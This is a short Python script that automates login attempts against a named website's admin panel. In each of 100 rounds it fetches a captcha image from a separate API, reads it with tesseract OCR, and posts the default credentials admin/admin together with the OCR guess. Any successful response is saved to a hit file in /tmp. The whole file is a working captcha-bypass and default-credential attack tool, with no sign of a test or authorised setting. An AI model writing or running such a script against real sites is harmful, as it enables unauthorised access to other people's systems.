import subprocess, json, base64, time
API = 'https://api.myxypt.com/captcha?width=140&height=48'
LOGIN = 'http://chinanaisi.com/admin/login.php'
C = '/tmp/cn_ocr.txt'
for i in range(100):
    try:
        # Get captcha
        r = subprocess.run(['curl','-sk','--connect-timeout','5',API,'-c',C,'-b',C],capture_output=True,text=True,timeout=8)
        d = json.loads(r.stdout)
        uuid = d['data']['uuid']
        b64 = d['data']['Captcha'].split(',')[1]
        img = base64.b64decode(b64)
        with open('/tmp/cn_cap.jpg','wb') as f: f.write(img)
        # OCR
        subprocess.run(['tesseract','/tmp/cn_cap.jpg','/tmp/cn_ocr_res','-c','tessedit_char_whitelist=0123456789','--psm','7'],timeout=5)
        try: code = open('/tmp/cn_ocr_res.txt').read().strip().replace(' ','')[:5]
        except: code = '0000'
        # Login
        r2 = subprocess.run(['curl','-sk','--connect-timeout','5','-L',LOGIN,'-X','POST','-d',f'action=loginpost&uuid={uuid}&loginId=&username=admin&password=admin&valicode={code}','-b',C],capture_output=True,text=True,timeout=8)
        result = 'WRONG'
        if '后台登录' not in r2.stdout and len(r2.stdout) > 100:
            result = r2.stdout[:200]
            open('/tmp/CNAI_HIT.txt','w').write(f'code={code} uuid={uuid}\n{result}')
        open('/tmp/cn_result.txt','a').write(f'{i}:OCR={code} {result[:50]}\n')
    except: pass
    if i%10==0: print(f'[{i}/100]')
print('DONE')
